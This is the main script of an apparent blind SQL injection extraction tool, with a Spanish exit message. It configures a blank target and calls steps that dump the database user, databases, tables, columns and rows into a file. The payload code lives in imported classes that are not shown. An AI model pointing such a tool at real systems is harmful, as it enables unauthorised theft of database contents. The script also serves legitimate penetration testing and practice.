#!/usr/bin/python3

import signal
import sys
import time
from pwn import log

import utils
from classes import (
    Extractor,
    GetRequest,
    PostRequest,
    ConditionalPayload,
    TextInCondition,
    StatusEqualCondition,
)


# Ctrl + c
def ctrlC(sig, frame):
    print(
        f"\n\n[{utils.Color.RED}x{utils.Color.END}] {utils.Color.BOLD}Saliendo...{utils.Color.END}\n"
    )
    sys.exit(1)


signal.signal(signal.SIGINT, ctrlC)


def main():

    # Initiate parameters specifying them
    main_url = ""
    headers = {}
    method = PostRequest()
    data = {}
    atribute_to_exploit = ""
    condition = TextInCondition("")
    payload = ConditionalPayload()
    num_threads = 1

    print(
        f"""
    {utils.Color.BOLD}#####################################################################################################################################{utils.Color.END}
    {utils.Color.BLUE}BBBBB   L      IIIII  N   N  DDDD {utils.Color.END}     {utils.Color.RED} SSS     QQQ    L      IIIII{utils.Color.END}      {utils.Color.BLUE}EEEEE  X   X  TTTTT  RRRR     A    CCCC  TTTTT   OOO   RRRR{utils.Color.END}
    {utils.Color.BLUE}B   B   L        I    NN  N  D   D{utils.Color.END}     {utils.Color.RED}S       Q   Q   L        I  {utils.Color.END}      {utils.Color.BLUE}E       X X     T    R   R   A A   C       T    O   O  R   R{utils.Color.END}
    {utils.Color.BLUE}BBBBB   L        I    N N N  D   D{utils.Color.END}     {utils.Color.RED} SSS    Q   Q   L        I  {utils.Color.END}      {utils.Color.BLUE}EEEE     X      T    RRRR   AAAAA  C       T    O   O  RRRR{utils.Color.END}
    {utils.Color.BLUE}B   B   L        I    N  NN  D   D{utils.Color.END}         {utils.Color.RED}S   Q  QQ   L        I  {utils.Color.END}      {utils.Color.BLUE}E       X X     T    R  R   A   A  C       T    O   O  R  R{utils.Color.END}
    {utils.Color.BLUE}BBBBB   LLLLL  IIIII  N   N  DDDD {utils.Color.END}     {utils.Color.RED}SSSS     QQ  Q  LLLLL  IIIII{utils.Color.END}      {utils.Color.BLUE}EEEEE  X   X    T    R   R  A   A  CCCC    T     OOO   R   R{utils.Color.END}
    {utils.Color.BOLD}#####################################################################################################################################{utils.Color.END}\n
    """
    )

    print(
        f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Url:{utils.Color.END} {main_url}"
    )
    print(
        f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Method:{utils.Color.END} {method}"
    )
    print(
        f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Headers:{utils.Color.END} {headers}"
    )
    print(
        f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Data:{utils.Color.END} {data}"
    )
    print(
        f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Field to exploit:{utils.Color.END} {atribute_to_exploit}"
    )
    print(
        f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Condition:{utils.Color.END} {condition}"
    )
    print(
        f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Threads:{utils.Color.END} {num_threads}"
    )

    instance = Extractor(
        main_url,
        headers,
        data,
        method,
        condition,
        payload,
        num_threads,
        atribute_to_exploit,
    )

    print("\n")
    label_menu = log.progress(utils.Color.RED + "Brute Force" + utils.Color.END)
    label_menu.status(" Starting ...")
    print("\n")
    time.sleep(1)

    instance.get_user(label_menu)
    instance.get_dbs(label_menu)
    instance.get_tables(label_menu)
    instance.get_columns(label_menu)
    instance.get_rows(label_menu)
    instance.build_file()


if __name__ == "__main__":
    main()
